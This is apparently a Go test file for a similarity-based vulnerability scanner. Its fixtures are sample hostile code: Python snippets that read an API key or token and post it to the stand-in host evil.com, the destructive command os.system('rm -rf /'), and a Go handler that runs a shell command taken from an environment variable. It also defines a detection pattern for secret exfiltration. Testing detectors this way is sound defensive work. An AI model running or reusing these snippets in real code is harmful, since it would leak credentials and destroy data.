package ir

import (
	"fmt"
	"testing"
)

func TestSimilarityEngineBasic(t *testing.T) {
	code := `import os
import requests

def exfiltrate():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("sim_test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewSimilarityEngine(nil, nil, 0.3)
	matches := engine.Search([]File{*file})

	fmt.Printf("=== 基本相似性搜索 ===\n")
	fmt.Printf("Matches: %d\n", len(matches))
	for _, m := range matches {
		fmt.Printf("  - %s\n", FormatSimilarityMatch(m))
	}
}

func TestSimilarityEngineHighThreshold(t *testing.T) {
	code := `import os
import requests

def exfiltrate():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("high_thresh.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 高阈值应该减少匹配
	engine := NewSimilarityEngine(nil, nil, 0.8)
	matches := engine.Search([]File{*file})

	fmt.Printf("=== 高阈值测试 ===\n")
	fmt.Printf("Matches: %d\n", len(matches))
}

func TestSimilarityEngineNoMatch(t *testing.T) {
	code := `def hello():
    print("hello world")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("safe_sim.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewSimilarityEngine(nil, nil, 0.5)
	matches := engine.Search([]File{*file})

	fmt.Printf("=== 安全代码测试 ===\n")
	fmt.Printf("Matches: %d (期望较少)\n", len(matches))
}

func TestSimilarityTokenize(t *testing.T) {
	code := `os.system("rm -rf /")`
	tokens := Tokenize(code)
	fmt.Printf("=== Token 化测试 ===\n")
	fmt.Printf("Code: %s\n", code)
	fmt.Printf("Tokens: %v\n", tokens)

	if len(tokens) == 0 {
		t.Error("should produce at least one token")
	}
}

func TestSimilarityTokenCompare(t *testing.T) {
	tokensA := []string{"os", "system", "exec", "command", "shell"}
	tokensB := []string{"os", "system", "rm", "rf", "delete"}
	tokensC := []string{"print", "hello", "world", "greeting"}

	engine := &SimilarityEngine{}
	ab := engine.tokenSimilarity(tokensA, tokensB)
	ac := engine.tokenSimilarity(tokensA, tokensC)

	fmt.Printf("=== Token 相似度比较 ===\n")
	fmt.Printf("A vs B: %.3f (应较高)\n", ab)
	fmt.Printf("A vs C: %.3f (应较低)\n", ac)

	if ab <= ac {
		t.Errorf("A-B similarity (%.3f) should be higher than A-C (%.3f)", ab, ac)
	}
}

func TestSimilarityEngineCustomPatterns(t *testing.T) {
	customPatterns := []KnownVulnPattern{
		{
			ID:          "custom-leak",
			Name:        "自定义数据泄露",
			Category:    "network_access",
			Severity:    "高风险",
			CodePattern: "secret key token password requests post upload send",
			Remediation: "禁止外发敏感数据",
		},
	}

	code := `import requests

def leak():
    token = get_secret()
    requests.post("https://evil.com", data=token)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("custom_leak.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewSimilarityEngine(customPatterns, nil, 0.3)
	matches := engine.Search([]File{*file})

	fmt.Printf("=== 自定义模式测试 ===\n")
	for _, m := range matches {
		fmt.Printf("  - %s\n", FormatSimilarityMatch(m))
	}
}

func TestSimilarityEngineGo(t *testing.T) {
	code := `package main

import (
	"net/http"
	"os"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := os.Getenv("CMD")
	exec.Command("sh", "-c", cmd).Run()
}
`

	parser, _ := GetParser("go")
	file, err := parser.Parse("handler.go", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewSimilarityEngine(nil, nil, 0.3)
	matches := engine.Search([]File{*file})

	fmt.Printf("=== Go 语言测试 ===\n")
	fmt.Printf("Matches: %d\n", len(matches))
	for _, m := range matches {
		fmt.Printf("  - %s\n", FormatSimilarityMatch(m))
	}
}

func TestDefaultVulnPatterns(t *testing.T) {
	patterns := DefaultVulnPatterns()
	fmt.Printf("=== 预定义模式数量 ===\n")
	fmt.Printf("Patterns: %d\n", len(patterns))

	if len(patterns) < 10 {
		t.Errorf("expected at least 10 patterns, got %d", len(patterns))
	}

	// 检查所有模式都有必要字段
	for _, p := range patterns {
		if p.ID == "" {
			t.Error("pattern missing ID")
		}
		if p.Name == "" {
			t.Errorf("pattern %s missing Name", p.ID)
		}
		if p.CodePattern == "" {
			t.Errorf("pattern %s missing CodePattern", p.ID)
		}
	}
}
